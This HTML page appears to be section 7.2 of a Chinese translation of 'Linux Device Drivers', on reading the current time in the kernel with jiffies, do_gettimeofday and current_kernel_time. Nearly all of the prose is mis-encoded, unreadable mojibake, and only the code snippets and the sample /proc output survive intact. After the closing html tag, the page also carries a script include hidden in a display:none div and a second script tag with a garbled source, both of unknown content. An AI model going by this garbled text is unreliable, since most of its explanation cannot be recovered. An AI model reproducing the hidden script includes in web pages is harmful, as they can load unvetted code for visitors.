<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>7.2.&#160;֪ǰʱ-Linux豸棨İ棩- - </title>
<meta name="description" content="- - " />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch07.html" title="&#160;7&#160;&#160;ʱ, ʱ, Ӻ">
<link rel="prev" href="ch07.html" title="&#160;7&#160;&#160;ʱ, ʱ, Ӻ">
<link rel="next" href="ch07s03.html" title="7.3.&#160;Ӻִ">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">7.2.&#160;֪ǰʱ</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch07.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;7&#160;&#160;ʱ, ʱ, Ӻ</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch07s03.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="KnowingtheCurrentTime.sect"></a>7.2.&#160;֪ǰʱ</h2></div></div></div>
<p>ں˴һֱȡһǰʱıʾ, ͨ鿴 jifies ֵ. , ֵֻһʱ, ʵ˵޹, Ϊϵͳ uptime. ʾ, ʹ jiffies ĵǰֵ¼֮ʱ(, дӵ˫߼㳬ʱ). 򵥵ؽ, 鿴 jiffies һֱ㹻, Ҫʱ. ҪԶʱʧķǳȷĲ, ضļĴæ( Ǵصֲ ).</p>
<p>ǷǳһҪ֪ǽʱʱ, , , Сʱ; ϢֻûҪ,  cron  syslogd. ʵʱ䳣ûռ,  C ṩ˸õ֧; , Ĵ볣̫ڲں. һں˺תһǽʱʱ䵽һ jiffies ֵ, :</p>
<pre class="programlisting">
#include &lt;linux/time.h&gt; 
unsigned long mktime (unsigned int year, unsigned int mon,
 unsigned int day, unsigned int hour,
 unsigned int min, unsigned int sec); 
</pre>
<p>ظ:ֱдǽʱʱһʵֲԵź, Ӧ˶.</p>
<p>Ȼ㲻һ˿ɶʱʾ, ʱҪں˿ռдʱ. Ϊ, &lt;linux/time.h&gt;  do_gettimeofday . ʱ, һ struct timeval ָ --   gettimeofday ϵͳʹõͬ -- ʹƵͺֵ. do_gettimeofday ԭ:</p>
<pre class="programlisting">
 #include &lt;linux/time.h&gt;
 void do_gettimeofday(struct timeval *tv);
</pre>
<p>Դ do_gettimeofday " ӽľ", ΪѯʱӲǰ jiffy Ѿʧ. ÿϵͬ, , ΪʵʹеӲ. , һЩ m68knommu , Sun3 ϵͳ,  m68k ϵͳṩ jiffy ľ. Pentium ϵͳ, һ, ṩ˷ǳٺ;ȷСյĲ, ͨȡǰʱ.</p>
<p>ǰʱҲ( ʹ jiffy  ) xtime , һ struct timespec ֵ. ֱʹ, Ϊԭӵͬʱȡ 2 ֶ. , ںṩʵú current_kernel_time:</p>
<pre class="programlisting">
#include &lt;linux/time.h&gt;
struct timespec current_kernel_time(void);
</pre>
<p>ԸַʽȡǰʱĴ, Դ O' Reilly ṩ FTP վϵԴļ jit ("just in time") ģ. jit һļΪ /proc/currentime, ȡʱ,  ASCII 뷵:</p>
<div class="itemizedlist"><ul type="disc">
<li><p>ǰ jiffies  jiffies_64 ֵ,  16 ʽ.</p></li>
<li><p>ͬ do_gettimeofday صͬĵǰʱ.</p></li>
<li><p> current_kernel_time ص timespec.</p></li>
</ul></div>
<p>ѡʹһ̬ /proc ļΪС -- ֵôһ豸ֻǷһıϢ.</p>
<p>ļıֻҪģ; ÿ read ϵͳռͷһ, ΪĶ֯Ϊ 2 . ۺʱһʱڶݼ, 㽫 do_gettimeofday ֮Ĳ, ѯӲ, ֵʱʱ.</p>
<pre class="screen">
phon% head -8 /proc/currentime
0x00bdbc1f 0x0000000100bdbc1f 1062370899.630126
 1062370899.629161488
0x00bdbc1f 0x0000000100bdbc1f 1062370899.630150
 1062370899.629161488
0x00bdbc20 0x0000000100bdbc20 1062370899.630208
 1062370899.630161336
0x00bdbc20 0x0000000100bdbc20 1062370899.630233
 1062370899.630161336
</pre>
<p>Ļ,  2 ȤҪע. ,  current_kernel_time ֵ, ʾ, ֻʱյ; do_gettimeofday һʱ䵫ǲһʱ. ڶ,  64-λ jiffies   32-λּϵЧλ.  INITIAL_JIFFIES ȱʡֵ, ʱʼ, ʱ󼸷ǿһ̽պص. ڼеĳʼƫûЧ, Ϊ jiffies ǽʱʱ޹.  /proc/uptime , ں˴Ӽгȡ uptime, ʼƫתǰȥ.</p>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch07.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch07.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch07s03.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">&#160;7&#160;&#160;ʱ, ʱ, Ӻ&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;7.3.&#160;Ӻִ</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>